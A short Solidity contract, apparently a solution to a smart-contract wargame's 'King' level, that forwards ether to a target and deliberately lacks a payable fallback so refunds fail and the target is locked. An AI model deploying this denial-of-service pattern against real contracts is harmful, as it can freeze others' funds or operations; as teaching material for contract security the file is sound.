pragma solidity ^0.4.18;


contract KingAttack {

  function doYourThing(address _target) public payable {
    _target.call.value(msg.value)();
  }

  // OMG NO PAYABLE FALLBACK!!
}
